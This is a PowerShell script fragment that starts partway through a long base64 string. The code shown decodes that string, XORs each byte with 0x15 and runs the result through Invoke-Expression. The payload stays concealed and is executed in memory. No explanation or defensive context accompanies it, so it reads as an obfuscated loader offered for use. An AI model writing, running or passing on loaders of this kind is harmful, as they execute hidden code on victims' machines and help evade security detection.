YldfVFZUVFRXVFNYVHFUV2xUUn5Ud3JXe1RQTFR0RFdmVFJAVEZEV2BUUkxUd2JUVFRSYlZUVFRX
VFFUVFhUVGJUUVRUWFRUJVRSXFRYVFRUVFd6VFREVFdUUFhUd2JXYVRSJVRPRFdgVF1EVHZiVFRU
VFRUVFRUJVRUelRURFdRVFItVHdEV2JUUlBUd3JXIFRQIVRMRFdhVFJAVFRUVFRUUCVUdERXf1Rd
XFR3YldvVFItVE9yVyVUVFRUWlRUXFRUUFRHcldlVFJiVE9EV1BUUkBUdmJXf1RdXFR0RFdiVF1E
VHREV2NUUiFUVFRUVFRdWFRMYldvVFJyVE9EV2ZUUmJUVFRUYlRUclRURFdSVFJ+VHdUV3lUU0xU
T0RXbFRdWFR0RFdjVFIhVFRUVFRUUVBUWXJUYlRWIVRYVFRgVFFUVFRUVCFUVGJUVERXX1RSIVRx
VFd5VF1cVHdyV31UUmJUQXJXfVRSJVRPRFRUVF1YVExiV29UUnJUT0RXZlRSYlRZcld5VF1yVE9E
VFRUU3pUUmJUV1RQYlRPRFd7VFJQVHdUV1FUUi1UdlRXIFRdXFR0RFd7VFJyVHFUVFRUUFhUd2JX
YlRdflR2cldlVFJ2VHRUVyVUVlRUZERUclRQJVR0RFd/VF1cVHdiV29UUi1UT3JXJVRWVFRYclRi
VFFcVFhEVFRUVFRUXnJUV1RUUFRBVFd5VFJ2VExEV2ZUU0RUdnJXfVRSRFRPRFdhVFJQVHZyV2dU
XVhUVFRUVFRUVFRUVFdUVFRiVFREV0VUXVxUdERXe1RSflR3cld9VFJiVEdyV2VUUmJUT0RXYFRS
UFR3RFd5VFRUVHZiV39UXVhUdFRXeVRSYlR3VFRgVFJAVHBUV3lUVFRUWFRUXFRUUFRAVFdsVFIt
VE9UVyRUUlhUcVRXWlRSUFR3RFd5VFRUVFRUV29UUlhUdmJXelRSQFR3VFdmVFRUVFtUVFxUVFBU
QFRXbFRSLVRPVFckVFJYVHFUV0JUUkBUdnJXb1RSflR3YldgVFRUVFhEVGBUUVRUWXJUYlRWIVRY
VFRUVFFyVFZUVFdUUFBUdmJXb1RSQFR3RFd8VFJiVHBEVHJUU0xUT0RXbFRdWFR0RFdjVFIhVFRU
VG1UViFUWFRUYFRRVFRZclRiVFRUVCVQWFRUWnpXVFRUVFRUVFRUVFRUVFo+ImNvYjpwUiRmXF1P
eXZ7W2V3JyEsXH9QYFhWXHJPQiB/dydHZXd4dixceUNAR3wlIVx8V29xUlNgT1JTZncnIHlFRl8g
T01YfEVvIVtWciVeRVJTb3YnQ2FMeG0gXF19YXdSIG9FRl8kdnghI3YnW3pPQiR9dmwkYXRCW2x3
JltjT3tEYUwnLGFaeFNvd0YgJ1hGXHJ3QlNgdEJPeXYmR0JPTV9vdEIsYEVGXG1Zf1R8RXIlXlxW
VC1MTVtvT0IkfHddeV9PUkNgcVJ5JXBGVydPTV9vdEIsYEVGXG1Zf1RgWFYhYlx8V2BMQiR5RUZf
W3BAU2J2Um1lTCdTJXRCLGBZeFNidlZcY0VyJV5cVlQtcV1fJHYmR193eE9jXF19YXdSIG9FRl8k
dnghI3YnW3pPQiR9dmwkYXRCW2x3JltjT3tEYUwnLGFaeFNvd0YgJ1h8XD5RRHpyXFZUckVdW3lM
JkNsdE1HIEVyJV5cVlRyXFZUckVdX3l2TUN5diZHeU9TV2x0TU9ld1JDe09NWHJwUiRmd3tYLFx7
Q2x3f2VvTCd9eXdCU29ZQiRlTCZfY3YnLHhxViR/dyclI0xNW2FZe0xvXH8hW1Z8VHJcVlRyXFZU
ckVdX3l2TUN5diZHeU9QQyFPQlskcVJ5Y3d+bXlxeENmXFJteXF4Q2ZFRl99diV5YHF4LGdPTVx8
XF1DZURCW39PTVtvRUZfeExCbW9PRlxjRXIlXlxWVHJcVlRyRVYsbE9NUyRPTVslT0JHRHZ4eSd0
Qm15TydDb0VyJV5cVlRyXFFiY3YnQ39xTV9lcV1+PlFEenJcUWJjcV1fJHYmR193eE9jRXIlXkVW
LH12Jlt5d0JfZnBBIVRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRRVFRUVGJU
VFRXclpyVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUKDcfNTU1NTFH
VEY1KDVORmxmYXB4O0dwc3lwdmF8ens7VGZmcHh3eWxILy9ZenRxPU5WentjcGdhSC8vU2d6eFd0
ZnAjIUZhZ3x7cj0xd3RmcCMhd3x7dGdsPDwfHzU1NTUxWnlxVnp7Znp5cFpgYTUoNU5Wentmenlw
SC8vWmBhHzU1NTUxRmFnfHtyQmd8YXBnNSg1W3BiOFp3f3B2YTVcWjtGYWd8e3JCZ3xhcGcfNTU1
NU5WentmenlwSC8vRnBhWmBhPTFGYWd8e3JCZ3xhcGc8Hx81NTU1TkZ9IWdlRlZGfSZ5eTtFZ3py
Z3R4SC8veHR8ez0xVnp4eHR7cTtGZXl8YT03NTc8PB8fNTU1NU5WentmenlwSC8vRnBhWmBhPTFa
eXFWentmenlwWmBhPB81NTU1MUdwZmB5YWY1KDUxRmFnfHtyQmd8YXBnO0F6RmFnfHtyPTwfNTU1
NTFHcGZgeWFmHzU1H2g="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

